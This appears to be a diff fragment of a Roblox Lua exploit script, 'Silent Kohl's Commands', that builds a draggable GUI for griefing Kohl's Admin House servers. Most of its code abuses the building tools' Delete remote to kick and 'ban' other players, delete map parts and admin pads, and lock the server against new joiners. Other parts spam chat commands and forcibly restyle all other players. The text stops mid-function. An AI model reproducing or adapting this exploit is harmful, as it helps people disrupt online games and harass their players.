+local memes2 = Instance.new('BoolValue')
+plrservice:Chat('h Loaded in Default SystemLogics')
+memes2.Value = true
+memes2.Name = 'EnabledLogic'
+memes2.Parent = game:GetService('Workspace')
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Kohl's Silent Commands";
+		Text = "Enabled KSC SystemLogic";
+	})
+local messagelib = {'punish all','kill all','explode all','fling all','swagify all','swagify others','respawn all','respawn others','punish others','kill others'}
+function matchmessage(...)
+for _,message in pairs(messagelib) do
+if string.match(...,message) then 
+return(true) end end
+for _,message in pairs(messagelib) do
+if string.match(..., ':' .. message) then 
+return(true) end end
+end
+function kickerplr(args)
+if not game:GetService('Players').LocalPlayer.Backpack:FindFirstChild('delete') then game:GetService('Players'):Chat('btools me') end
+wait(.5)
+plrservice.LocalPlayer.Backpack['Delete']['delete']:FireServer(args)
+end
+local preOps = coroutine.wrap(function()
+for _,plrobject in pairs(plrservice:GetChildren()) do
+if plrobject ~= game:GetService('Players').LocalPlayer then
+plrservice[tostring(plrobject)].Chatted:Connect(function(M)
+if matchmessage(M) == true then warn('KSC SystemLogic 1') 
+kickerplr(plrobject) 
+plrservice:Chat('h ' .. plrservice[tostring(plrobject.Name)] .. ' has been kicked for saying ' .. M) 
+print(plrservice[tostring(plrobject.Name)] .. ' has been kicked by KSC')
+end end) end end
+memes2.Changed:Connect(function() if memes2.Value == false then warn('Ended KSC Function "DefinedSystem"') local stop = coroutine.yield() end end)
+end)
+preOps()
+end
+end
+
+
+
+
+function preEnt(args)
+if args == 'musicbot' then
+KSCBOT()
+elseif args == 'repads' then
+globalreset()
+elseif args == 'Mover' then
+am()
+elseif args == 'hidepads' then
+globalhide()
+elseif args == 'antiabuse' then
+DefinedSystem()
+elseif args == 'disableanti' then
+EndKSCDS()
+elseif string.find(args, 'adminx') then
+addadmins(args)
+elseif string.find(args, 'readmin') then
+removeadmins(args)
+elseif args == 'invert' then
+invertedcolors()
+elseif args == 'reBase' then
+local stats,statsm = pcall(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild('Move') then 
+game.Players:Chat('btools me') 
+end
+wait(.5)
+local cf = CFrame.new(0,0,0,0,0,-1,0,1,0,1,0,0)
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Workspace.Baseplate, cf)
+end)
+print(stats,statsm)
+elseif args == 'CloneHouse' then
+CH()
+elseif args == 'smol' then re()
+else
+game.Players:Chat(args)
+for i = 1,500 do   
+game.Players:Chat(_G.BT)
+end end end	
+function Enter(enterPressed, Object)
+if enterPressed then
+preEnt(Object)
+end
+end
+local TweenService = game:GetService("TweenService")
+local light = Frame
+local goal = {}
+goal.Size = UDim2.new(0,200,0,250)
+local goal2 ={}
+goal2.Size =  UDim2.new(0,200,0,165)
+local tweenInfo = TweenInfo.new(.25)
+local tweenlarge = TweenService:Create(light, tweenInfo, goal)
+local tweensmall = TweenService:Create(light, tweenInfo, goal2)
+local parent2 = Fr2
+
+--Prop
+SGui.ResetOnSpawn = false
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.BackgroundTransparency = 0.5
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Name = 'メイン'
+Frame.Draggable = true
+Frame.Size = UDim2.new(0, 200, 0, 165)
+Frame.Position = UDim2.new(0, 0, .5, -82.5)
+
+local sndmin = Instance.new('Sound')
+sndmin.SoundId = 'rbxassetid://421058925'
+sndmin.Playing = false
+if _G.sfxEnabled == false then
+sndmin.Volume = 0
+else
+sndmin.Volume = .5
+end
+sndmin.Name = 'クリック'
+sndmin.Looped = false
+sndmin.Parent = sfxf
+
+local critical = Instance.new('Sound')
+critical.SoundId = 'rbxassetid://160715357'
+if _G.sfxEnabled == false then
+	critical.Volume = 0
+	else
+	critical.Volume = .5
+	end
+critical.Name = 'エラー'
+critical.Looped = false
+critical.Parent = sfxf
+
+local sndshutdown = Instance.new('Sound')
+sndshutdown.SoundId = 'rbxassetid://784747919'
+sndshutdown.Playing = false
+if _G.sfxEnabled == false then
+sndshutdown.Volume = 0
+else
+sndshutdown.Volume = .5
+end
+sndshutdown.Name = '閉鎖'
+sndshutdown.Looped = false
+sndshutdown.Parent = game:GetService('SoundService')
+
+SGui.DescendantRemoving:Connect(function()
+flagged = false
+if not CCSecured then CCSecured = true
+if workspace:FindFirstChild('Core') then workspace.Core:Destroy() end
+wait()
+SGui:Destroy()
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "KSC";
+		Text = "UI Change Was Detected";
+	})
+local tr, dump2 = pcall(function()
+sndshutdown:Play()
+wait(2)
+sndshutdown:Destroy()
+end)
+end
+end)
+
+
+function minsnd()
+sndmin:Play()
+end
+
+
+Title.Font = 12
+Title.TextSize = 20
+Title.Position = UDim2.new(0, 0, 0, -5)
+Title.BackgroundColor3 = Color3.new(0, 0, 0)
+Title.BackgroundTransparency = 0.5
+Title.Size = UDim2.new(0, 200, 0, 50)
+Title.Name = 'タイトル'
+Title.TextWrapped = true
+Title.BorderSizePixel = 0
+Title.Text = "Silent Kohl's Commands"
+
+KickPerson.Text = ""
+KickPerson.Name = 'キック'
+KickPerson.TextColor3 = Color3.new (100, 0, 100)
+KickPerson.BackgroundColor3 = Color3.new(0, 0, 0)
+KickPerson.BackgroundTransparency = 0.5
+KickPerson.Font = 12
+KickPerson.BorderSizePixel = 2
+KickPerson.Size = UDim2.new(0, 150, 0, 40)
+KickPerson.Position = UDim2.new(0, 25, 0, 155)
+KickPerson.TextScaled = true
+KickPerson.Visible = false
+
+function GetPlayer(plrname)
+	for _,player in pairs(game.Players:GetPlayers()) do
+		if plrname:lower() == player.Name:sub(1,plrname:len()):lower() then
+			if player ~= game:GetService('Players').LocalPlayer then
+			return player
+			end
+		end
+	end
+	return nil
+end
+
+function PreOperations()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5)
+local target = GetPlayer(KickPerson.Text)
+if target then
+game.Players.LocalPlayer.Backpack.Delete.delete:FireServer(target)
+KickPerson.Text = "Kicked ! Player Name (" .. target.Name .. ')'
+print("Kicked ! Player Name (" .. target.Name .. ')')
+end
+else
+local target = GetPlayer(KickPerson.Text)
+if target then
+game.Players.LocalPlayer.Backpack.Delete.delete:FireServer(target)
+KickPerson.Text = "Kicked ! Player Name (" .. target.Name .. ')'
+print("Kicked ! Player Name (" .. target.Name .. ')')
+end
+end
+end
+
+function EnterKick(enterPressed)
+if enterPressed then 
+PreOperations()
+end
+end
+
+BanPerson.Text = ""
+BanPerson.Name = 'キック(BNR)'
+BanPerson.TextColor3 = Color3.new (100, 0, 100)
+BanPerson.BackgroundColor3 = Color3.new(0, 0, 0)
+BanPerson.BackgroundTransparency = 0.5
+BanPerson.Font = 12
+BanPerson.BorderSizePixel = 2
+BanPerson.Size = UDim2.new(0, 150, 0, 40)
+BanPerson.Position = UDim2.new(0, 25, 0, 155)
+BanPerson.TextScaled = true
+BanPerson.Visible = false
+
+BanPlayer.BackgroundColor3 = Color3.new(0, 0 ,0)
+BanPlayer.BackgroundTransparency = 0.5
+BanPlayer.Text = 'Ban'
+BanPlayer.Name = 'ボタン（K）'
+BanPlayer.TextColor3 = Color3.new(200, 0, 0)
+BanPlayer.BorderSizePixel = 2
+BanPlayer.Font = 12
+BanPlayer.TextScaled = true
+BanPlayer.Position = UDim2.new(0, 25, 0, 200)
+BanPlayer.Size = UDim2.new(0, 150, 0, 25)
+BanPlayer.Visible = false
+
+
+KickPlayer.BackgroundColor3 = Color3.new(0, 0 ,0)
+KickPlayer.BackgroundTransparency = 0.5
+KickPlayer.Text = 'Kick'
+KickPlayer.Name = 'ボタン（K）'
+KickPlayer.TextColor3 = Color3.new(200, 0, 0)
+KickPlayer.BorderSizePixel = 2
+KickPlayer.Font = 12
+KickPlayer.TextScaled = true
+KickPlayer.Position = UDim2.new(0, 25, 0, 200)
+KickPlayer.Size = UDim2.new(0, 150, 0, 25)
+KickPlayer.Visible = false
+
+del.BackgroundColor3 = Color3.new(0, 0 ,0)
+del.BackgroundTransparency = 0.5
+del.Text = 'Name All'
+del.Name = 'ボタン（N）'
+del.TextColor3 = Color3.new(200, 0, 0)
+del.BorderSizePixel = 2
+del.Font = 12
+del.TextScaled = true
+del.Position = UDim2.new(0, 25, 0, 200)
+del.Size = UDim2.new(0, 150, 0, 25)
+del.Visible = false
+
+Person.Text = "[Command]"
+Person.PlaceholderText = '[Command]'
+Person.TextColor3 = Color3.new (100, 0, 100)
+Person.BackgroundColor3 = Color3.new(0, 0, 0)
+Person.BackgroundTransparency = 0.5
+Person.Font = 12
+Person.Name = 'タイプボックス'
+Person.BorderSizePixel = 2
+Person.Size = UDim2.new(0, 150, 0, 40)
+Person.Position = UDim2.new(0, 25, 0, 75)
+Person.TextScaled = true
+
+Insane.BackgroundColor3 = Color3.new(0, 0 ,0)
+Insane.BackgroundTransparency = 0.5
+Insane.Text = "Chat"
+Insane.Name = 'チャット（M）'
+Insane.TextColor3 = Color3.new(200, 0, 0)
+Insane.BorderSizePixel = 2
+Insane.Font = 12
+Insane.TextScaled = true
+Insane.Position = UDim2.new(0, 25, 0, 120)
+Insane.Size = UDim2.new(0, 150, 0, 25)
+scalar.Scale = 1.15
+
+weeb.BackgroundColor3 = Color3.new(0, 0 ,0)
+weeb.BackgroundTransparency = 0.5
+weeb.Text = "Kick"
+weeb.Name = 'キック（S）'
+weeb.TextColor3 = Color3.new(100, 2, 0)
+weeb.BorderSizePixel = 0
+weeb.Font = 12
+weeb.TextSize = 15
+weeb.Position = UDim2.new(0, 200, 0, 20)
+weeb.Size = UDim2.new(0, 50, 0, 30)
+
+
+ban.BackgroundColor3 = Color3.new(0, 0 ,0)
+ban.BackgroundTransparency = 0.5
+ban.Text = "Ban"
+ban.Name = 'キック（BNR）'
+ban.TextColor3 = Color3.new(100, 2, 0)
+ban.BorderSizePixel = 0
+ban.Font = 12
+ban.TextSize = 15
+ban.Position = UDim2.new(0,200,0,110)
+ban.Size = UDim2.new(0, 50, 0, 30)
+
+workin.BackgroundColor3 = Color3.new(0, 0 ,0)
+workin.BackgroundTransparency = 0.5
+workin.Text = "Part"
+workin.Name = 'ロック解除'
+workin.TextColor3 = Color3.new(100, 2, 0)
+workin.BorderSizePixel = 0
+workin.Font = 12
+workin.TextSize = 15
+workin.Position = UDim2.new(0, 200, 0, 50)
+workin.Size = UDim2.new(0, 50, 0, 30)
+
+remover.BackgroundColor3 = Color3.new(0, 0 ,0)
+remover.BackgroundTransparency = 0.5
+remover.Text = "Name"
+remover.Name = '名'
+remover.TextColor3 = Color3.new(100, 2, 0)
+remover.BorderSizePixel = 0
+remover.Font = 12
+remover.TextSize = 15
+remover.Position = UDim2.new(0, 200, 0, 80)
+remover.Size = UDim2.new(0, 50, 0, 30)
+
+Fr2.Parent = workin
+Fr2.Name = '部品'
+Fr2.Visible = false
+Fr2.Size = UDim2.new(0,130,0,27)
+Fr2.Position = UDim2.new(1,0,0.08,0)
+Fr2.BackgroundColor3 = Color3.new(0,0,0)
+Fr2.BackgroundTransparency = 0.3
+
+ext.Size = UDim2.new(0,50,0,25)
+ext.Position = UDim2.new(0,200,0,140)
+ext.Text = 'Extras'
+ext.Font = 12
+ext.TextScaled = true
+ext.TextColor3 = Color3.new(100, 2, 0)
+ext.BackgroundColor3 = Color3.new(0,0,0)
+ext.BackgroundTransparency = 0.5
+ext.BorderSizePixel = 0
+ext.Name = '?'
+
+antexa.Size = UDim2.new(0,20,0,20)
+antexa.Position = UDim2.new(0,0,0,45)
+antexa.Text = 'A/E'
+antexa.Font = 12
+antexa.TextScaled = true
+antexa.TextColor3 = Color3.fromRGB(255, 0, 0)
+antexa.BackgroundColor3 = Color3.new(0,0,0)
+antexa.BorderSizePixel = 0
+antexa.BackgroundTransparency = 0.5
+antexa.Name = '-2;kr'
+
+antexadis.Size = UDim2.new(0,20,0,20)
+antexadis.Position = UDim2.new(0,0,0,45)
+antexadis.Text = 'A/E'
+antexadis.Visible = false
+antexadis.Font = 12
+antexadis.TextScaled = true
+antexadis.TextColor3 = Color3.fromRGB(0, 255, 0)
+antexadis.BackgroundColor3 = Color3.new(0,0,0)
+antexadis.BorderSizePixel = 0
+antexadis.BackgroundTransparency = 0.5
+antexadis.Name = '-1;kr'
+
+function hckrproof(plrtest)
+if plrtest.OsPlatform == 'Win32' or 'Windows_Univseral' then 
+plrtest.Backpack['Delete']['delete']:FireServer(plrtest.Backpack['Delete'])
+game.Players:Chat('reset ' .. plrtest.Name)
+wait()
+game.Players:Chat('pm ' .. plrtest.Name .. ' For your own safety, btools are not allowed on ' .. plrtest.OsPlatform ..  '.')
+print(plrtest.Name .. ' tried to access btools.')
+end
+end
+
+
+
+function rrs()
+local mem = Instance.new('BoolValue')
+mem.Name = 'Core'
+wait()
+mem.Parent = workspace
+mem.Value = true
+local msg = 'Ended due to user input (D)'
+--var
+local plrn = game:GetService('Players').LocalPlayer.Name
+local anti2 = coroutine.wrap(function()
+	while mem.Parent == workspace do
+	wait()
+	for i,v in pairs(workspace:GetDescendants()) do	
+	if v.Name == 'delete' then
+	if not v:FindFirstAncestor(game.Players.LocalPlayer.Name) then
+	v:FireServer(v.Parent)
+	warn('Potential exploits found.') critical:Play()
+	end
+	end
+	end
+	end
+warn('Refer to user2.')
+end)
+anti2()
+print('Initializing anti-exploit kick protocol V2.0')
+while mem.Parent == workspace do 
+wait()
+for i,v in pairs(game.Players:GetDescendants()) do
+if v.Name == 'delete' then
+local s,msg = pcall(function()
+if v.Parent.Parent.Parent.Name ~= plrn then 
+local rr = v.Parent.Parent.Parent
+local plrtried = v.Parent.Parent.Parent.Name
+hckrproof(rr)
+end
+end)
+if not s then 
+if string.match(msg, '(a nil value)') then warn('Trigger, please kick player immediately')
+end
+end
+end
+end
+end
+warn('Refer to user1.')
+print('-------------------')
+print('Finished')
+	if _G.Notify == true then
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Anti-Kick";
+		Text = "Disabled";
+		Duration = .2
+	})
+end
+end
+
+antexa.MouseButton1Click:Connect(function()
+if not workspace:FindFirstChild('Core') then
+rrs()
+end
+end)
+
+workspace.ChildAdded:Connect(function(child)
+if child.Name == 'Core' then
+antexa.Visible = false antexadis.Visible = true else 
+end
+end)
+anttog.Size = UDim2.new(0,20,0,20)
+anttog.Position = UDim2.new(0,20,0,45)
+anttog.Text = 'D'
+anttog.Visible = true
+anttog.Font = 12
+anttog.BorderSizePixel = 0
+anttog.TextSize = 10
+anttog.TextColor3 = Color3.fromRGB(255, 0, 0)
+anttog.BackgroundColor3 = Color3.new(0,0,0)
+anttog.BackgroundTransparency = 0.5
+anttog.Name = '-1;kr'
+
+anttog.MouseButton1Click:Connect(function()
+if workspace:FindFirstChild('Core') then
+workspace.Core:Destroy() antexa.Visible = true antexadis.Visible = false
+end
+end) 
+
+local ccsr = false
+function porl ()
+if ccsr == false then ccsr = true
+antexa.Position = UDim2.new(0,0,0,50)
+antexadis.Position = UDim2.new(0,0,0,50)
+anttog.Position = UDim2.new(0,20,0,50)
+else antexa.Position = UDim2.new(0,0,0,45) antexadis.Position = UDim2.new(0,0,0,45) anttog.Position = UDim2.new(0,20,0,45) ccsr = false
+end
+end
+
+r1.Name = '最初' 
+r2.Name = '第二' 
+r3.Name = '三番' 
+r1.Text = '1'
+r2.Text = '1'
+r3.Text = '1'
+r1.Parent = Fr2 
+r2.Parent = Fr2 
+r3.Parent = Fr2
+r1.BackgroundColor3 = Color3.fromRGB(255,255,255) 
+r1.BackgroundTransparency = .1 
+r1.BorderSizePixel = 3 
+r1.BorderColor3 = Color3.new(0,0,0)
+r2.BackgroundColor3 = Color3.fromRGB(255,255,255) 
+r2.BackgroundTransparency = .1 
+r2.BorderSizePixel = 3 
+r2.BorderColor3 = Color3.new(0,0,0)
+r3.BackgroundColor3 = Color3.fromRGB(255,255,255) 
+r3.BackgroundTransparency = .1 
+r3.BorderSizePixel = 3 
+r3.BorderColor3 = Color3.new(0,0,0)
+r1.Position = UDim2.new(0.025,0,0.025,0) 
+r2.Position = UDim2.new(0.275,0,0.025,0)
+r3.Position = UDim2.new(0.5,0,0.025,0)
+r1.Size = UDim2.new(0,25,0,25) 
+r2.Size = UDim2.new(0,25,0,25) 
+r3.Size = UDim2.new(0,25,0,25)
+r1.Font = 13 
+r1.TextScaled = true
+r2.Font = 13 
+r2.TextScaled = true
+r3.Font = 13
+r3.TextScaled = true
+ 
+rand.Name = 'ランダム'
+rand.Parent = Fr2
+rand.Size = UDim2.new(0,125,0,25)
+rand.Position = UDim2.new(0,0,1.1,0)
+rand.BackgroundColor3 = Color3.new(0,0,0)
+rand.BackgroundTransparency = 0.5
+rand.Text = 'Randomize!'
+rand.TextColor3 = Color3.fromRGB(255,255,255)
+rand.TextScaled = true
+rand.Font = 19
+
+sp.Name = '場所'
+sp.Parent = Fr2
+sp.Text = 'Spawn'
+sp.TextScaled = true
+sp.Size = UDim2.new(0,25,0,25)
+sp.TextColor3 = Color3.fromRGB(255,255,255)
+sp.Position = UDim2.new(0.75,0,0,0)
+sp.BackgroundColor3 = Color3.fromRGB(70,70,70)
+sp.BackgroundTransparency = .5
+
+but1.Parent = Frame
+but1.Name = 'オビー'
+but1.Visible = false
+but1.BorderSizePixel = 1
+but1.BorderColor3 = Color3.new(0,0,0)
+but1.Size = UDim2.new(0,50,0,25)
+but1.Position = UDim2.new(0.08,0,.6,0)
+but1.Text = 'Obby'
+but1.TextSize = 8
+but1.TextColor3 = Color3.new(100, 2, 0)
+but1.BackgroundColor3=Color3.new(0,0,0)
+but1.BackgroundTransparency = .5
+
+but2.Parent = Frame
+but2.Visible = false
+but2.BorderSizePixel = 1
+but2.BorderColor3 = Color3.new(0,0,0)
+but2.Size = UDim2.new(0,50,0,25)
+but2.Position = UDim2.new(0.38,0,.6,0)
+but2.Text = 'Baseplate'
+but2.Name = 'あなたの基地はすべて私たちのものです'
+but2.TextSize = 8
+but2.TextColor3 = Color3.new(100, 2, 0)
+but2.BackgroundColor3=Color3.new(0,0,0)
+but2.BackgroundTransparency = .5
+
+but3.Parent = Frame
+but3.Visible = false
+but3.BorderSizePixel = 1
+but3.BorderColor3 = Color3.new(0,0,0)
+but3.Size = UDim2.new(0,50,0,25)
+but3.Position = UDim2.new(0.68,0,.6,0)
+but3.Text = 'Barriers'
+but3.Name = 'フェンス'
+but3.TextSize = 8
+but3.TextColor3 = Color3.new(100, 2, 0)
+but3.BackgroundColor3=Color3.new(0,0,0)
+but3.BackgroundTransparency = .5
+
+but4.Parent = Frame
+but4.Visible = false
+but4.BorderSizePixel = 1
+but4.BorderColor3 = Color3.new(0,0,0)
+but4.Size = UDim2.new(0,50,0,25)
+but4.Position = UDim2.new(0.08,0,.75,0)
+but4.Text = 'House'
+but4.Name = '家'
+but4.TextSize = 8
+but4.TextColor3 = Color3.new(100, 2, 0)
+but4.BackgroundColor3=Color3.new(0,0,0)
+but4.BackgroundTransparency = .5
+
+but5.Parent = Frame
+but5.Visible = false
+but5.BorderSizePixel = 1
+but5.BorderColor3 = Color3.new(0,0,0)
+but5.Size = UDim2.new(0,50,0,25)
+but5.Position = UDim2.new(0.38,0,.75,0)
+but5.Text = 'Unlock'
+but5.Name=  'ロック解除'
+but5.TextSize = 8
+but5.TextColor3 = Color3.new(100, 2, 0)
+but5.BackgroundColor3=Color3.new(0,0,0)
+but5.BackgroundTransparency = .5
+
+but6.Parent = Frame
+but6.Visible = false
+but6.BorderSizePixel = 1
+but6.BorderColor3 = Color3.new(0,0,0)
+but6.Size = UDim2.new(0,50,0,25)
+but6.Position = UDim2.new(0.68,0,.75,0)
+but6.Text = 'Pads'
+but6.Name = '管理ボタン'
+but6.TextSize = 8
+but6.TextColor3 = Color3.new(100, 2, 0)
+but6.BackgroundColor3=Color3.new(0,0,0)
+but6.BackgroundTransparency = .5
+
+but7.Parent = Frame
+but7.Visible = false
+but7.BorderSizePixel = 1
+but7.BorderColor3 = Color3.new(0,0,0)
+but7.Size = UDim2.new(0,50,0,25)
+but7.Position = UDim2.new(0.05,0,.895,0)
+but7.Text = 'TP'
+but7.Name = 'テレポート'
+but7.TextSize = 8
+but7.TextColor3 = Color3.new(100, 2, 0)
+but7.BackgroundColor3=Color3.new(0,0,0)
+but7.BackgroundTransparency = .5
+
+but8.Parent = Frame
+but8.Visible = false
+but8.BorderSizePixel = 1
+but8.BorderColor3 = Color3.new(0,0,0)
+but8.Size = UDim2.new(0,50,0,25)
+but8.Position = UDim2.new(0.34,0,.895,0)
+but8.Text = 'Slock(OFF)'
+but8.Name = 'サーバーロック(状態)'
+but8.TextSize = 5
+but8.TextColor3 = Color3.new(100, 2, 0)
+but8.BackgroundColor3=Color3.new(0,0,0)
+but8.BackgroundTransparency = .5
+
+but9.Parent = Frame
+but9.Visible = false
+but9.BorderSizePixel = 1
+but9.BorderColor3 = Color3.new(0,0,0)
+but9.Size = UDim2.new(0,15,0,25)
+but9.Position = UDim2.new(0.59,0,.895,0)
+but9.Text = '>'
+but9.Name = 'サーバーロック(T)'
+but9.TextSize = 8
+but9.TextColor3 = Color3.fromRGB(0, 255, 0)
+but9.BackgroundColor3=Color3.new(0,0,0)
+but9.BackgroundTransparency = .5
+
+but10.Parent = Frame
+but10.Visible = false
+but10.BorderSizePixel = 1
+but10.BorderColor3 = Color3.new(0,0,0)
+but10.Size = UDim2.new(0,50,0,25)
+but10.Position = UDim2.new(0.7,0,.895,0)
+but10.Text = 'Thanos'
+but10.Name = 'サーバーロック(T)'
+but10.TextSize = 8
+but10.TextColor3 = Color3.fromRGB(0, 255, 0)
+but10.BackgroundColor3=Color3.new(0,0,0)
+but10.BackgroundTransparency = .5
+
+Close.Parent = Frame
+Close.BackgroundColor3 = Color3.new(0, 0, 0)
+Close.BackgroundTransparency = 0.5
+Close.BorderSizePixel = 0
+Close.Name = '閉じる'
+Close.Position = UDim2.new(0, 200, 0, -5)
+Close.Size = UDim2.new(0, 25, 0, 25)
+Close.Font = Enum.Font.Arcade
+Close.Text = "X"
+Close.TextColor3 = Color3.new(100, 0, 0)
+Close.TextSize = 16
+
+minimize.Name = 'Min'
+minimize.Parent = Frame
+minimize.BackgroundColor3 = Color3.new(0, 0, 0)
+minimize.BackgroundTransparency = 0.5
+minimize.BorderSizePixel = 0
+minimize.Position = UDim2.new(0, 225, 0, -5)
+minimize.Size = UDim2.new(0, 25, 0, 25)
+minimize.Text = "-"
+minimize.Font = Enum.Font.Arcade
+minimize.TextColor3 = Color3.new(100, 0, 0)
+minimize.TextSize = 16
+--CC
+local buttons ={but1,but2,but3,but4,but5,but6,but7,but8,but9,but10}
+function visr(a)
+if a == '1' then
+for i,v in pairs(buttons) do
+v.Visible = true
+end
+else
+for i,v in pairs(buttons) do
+v.Visible = false
+end
+end
+end
+
+function cf(a)
+if _G.ForceCapture == true then a:CaptureFocus() end
+end
+
+weeb.MouseButton1Click:connect(function()
+remover.Visible = false ext.Visible = false ban.Visible = false cf(KickPerson)
+if KickPerson.Visible == false then weeb.Visible = false KickPerson.Text = '[Player]' tweenlarge:Play() wait(.25) KickPerson.Visible = true KickPlayer.Visible = true weeb.Visible = true
+else KickPerson.Visible = false KickPlayer.Visible = false weeb.Visible = false tweensmall:Play() weeb.Visible = true remover.Visible = true ext.Visible = true ban.Visible = true KickPerson.Text = '[Text]'
+end
+end)
+
+ban.MouseButton1Click:Connect(function()
+remover.Visible = false ext.Visible = false weeb.Visible = false cf(BanPerson)
+if BanPerson.Visible == false then BanPerson.Text = '[Player]' ban.Visible = false tweenlarge:Play() wait(.25) BanPerson.Visible = true BanPlayer.Visible = true ban.Visible = true
+else BanPerson.Visible = false BanPlayer.Visible = false ban.Visible = false tweensmall:Play() ban.Visible = true remover.Visible = true ext.Visible = true weeb.Visible = true
+end
+end)
+
+ext.MouseButton1Click:connect(function()
+if but1.Visible == false then ext.Visible = false remover.Visible = false weeb.Visible = false ban.Visible = false
+tweenlarge:Play() wait(.25) ext.Visible = true visr('1') 
+else
+visr('2') ext.Visible = false tweensmall:Play() ext.Visible = true remover.Visible = true weeb.Visible = true ban.Visible = true
+end
+end)
+
+but1.MouseButton1Click:Connect(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5) game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Workspace:FindFirstChild('Obby'))
+else
+game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Workspace:FindFirstChild('Obby'))
+end
+end)
+
+but2.MouseButton1Click:Connect(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5) game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Workspace:FindFirstChild('Baseplate'))
+else
+game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Workspace:FindFirstChild('Baseplate'))
+end
+end)
+
+but3.MouseButton1Click:Connect(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5) game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Workspace:FindFirstChild('Obby Box'))
+else
+game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Workspace:FindFirstChild('Obby Box'))
+end
+end)
+
+but4.MouseButton1Click:Connect(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5) game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Workspace:FindFirstChild('Basic House'))
+else
+game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Workspace:FindFirstChild('Basic House'))
+end
+end)
+
+but5.MouseButton1Click:Connect(function()
+for i,v in pairs(game.Workspace:GetDescendants()) do
+if v:IsA("Part") then 
+v.Locked = false
+end end
+game.Players:Chat("unlock all")
+end)
+
+function fbt()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+end
+end
+
+
+local togg = true
+function slocker()
+game.Players.PlayerAdded:connect(function(plrt)
+if togg == false then
+fbt()
+wait()
+game.Players.LocalPlayer.Backpack:WaitForChild('Delete')['delete']:FireServer(plrt)
+end
+end)
+end
+
+but6.MouseButton1Click:Connect(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5) game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(game.Workspace.Terrain.GameFolder.Admin:FindFirstChild('Pads'))       game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(game.Workspace.Terrain.GameFolder.Workspace:FindFirstChild("Admin Dividers"))       
+else
+game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(game.Workspace.Terrain.GameFolder.Admin:FindFirstChild('Pads'))       game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(game.Workspace.Terrain.GameFolder.Workspace:FindFirstChild("Admin Dividers"))       
+end
+end)
+
+but7.MouseButton1Click:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-33.2027435, 8.22999954, 82.6940842))
+end)
+
+but9.MouseButton1Click:Connect(function()
+if togg == true then
+but8.Text = 'Slock(ON)' but9.TextColor3 = Color3.fromRGB(255,0,0) togg = false
+else but8.Text = 'Slock(OFF)' but9.TextColor3 = Color3.fromRGB(0,255,0) togg = true
+end	
+end)
+
+but10.MouseButton1Click:Connect(function()
+	game.Players:Chat('music 3191563189')
+game.Players:Chat('m It\'s thanos time.')
+wait(2)
+--SteampunkGlove
+game.Players:Chat('removehats others')
+game.Players:Chat('paint others Royal purple')
+game.Players:Chat('face others 255827175')
+game.Players:Chat('pants others 3162111513')
+game.Players:Chat('shirt others 2017558555')
+for i,v in pairs(game.Players:GetChildren()) do
+if not v.Backpack:FindFirstChild('SteampunkGlove') then
+game.Players:Chat('gear ' .. v.Name ..' 243790334')
+end
+end
+wait(.35)
+	
+end)
+slocker()
+
+function entban()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5)
+local target = GetPlayer(BanPerson.Text)
+if target then
+table.insert(BanLand,target.Name)
+game.Players.LocalPlayer.Backpack.Delete.delete:FireServer(target)
+BanPerson.Text = "Banned! Player Name (" .. target.Name .. ')'
+print("Banned! Player Name (" .. target.Name .. ')')
+end
+else
+local target = GetPlayer(BanPerson.Text)
+if target then
+table.insert(BanLand,target.Name)
+game.Players.LocalPlayer.Backpack.Delete.delete:FireServer(target)
+BanPerson.Text = "Banned! Player Name (" .. target.Name .. ')'
+print("Banned! Player Name (" .. target.Name .. ')')
+end
+end
+end
+
+
+function lazzei(enterPressed)
+if BanPlayer.Visible == true then
+if enterPressed then
+entban(Person.Text)
+end
+end
+end
+
+Person.FocusLost:Connect(function(enterPressed)
+if _G.EnterToExecute == true then
+Enter(enterPressed, Person.Text)
+end
+end)
+
+
+
+BanPerson.FocusLost:Connect(function(enterPressed)
+if _G.EnterToExecute == true then
+lazzei(enterPressed)
+end
+end)
+
+
+Insane.MouseButton1Down:connect(function()
+preEnt(Person.Text)
+end)
+
+remover.MouseButton1Click:connect(function()
+weeb.Visible = false ext.Visible = false ban.Visible = false
+if del.Visible == false then remover.Visible = false KickPerson.Text = '[Text]' tweenlarge:Play() wait(.25) KickPerson.Visible = true del.Visible = true remover.Visible = true
